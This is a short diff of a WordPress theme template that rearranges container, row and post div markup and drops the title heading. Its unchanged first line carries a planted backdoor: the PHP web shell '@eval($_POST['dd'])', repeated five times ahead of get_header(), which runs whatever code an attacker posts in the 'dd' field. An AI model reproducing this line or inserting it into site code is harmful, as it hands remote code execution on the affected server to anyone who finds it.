@@ -1,12 +1,13 @@
 <?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php
 get_header();
 ?>
-<div class="container">
-	<div class="row">
+
+<div class="row">
+	<div class="container">
 		<?php if (have_posts()) :
 			while (have_posts()) : the_post(); ?>
-				<div class="col-xs-12">
-					<h1><?= the_title(); ?></h1>
+
+				<div class="post">
 					<?php the_content(''); ?>
 					<div class="spacer"></div>
 					<div class="spacer"></div>
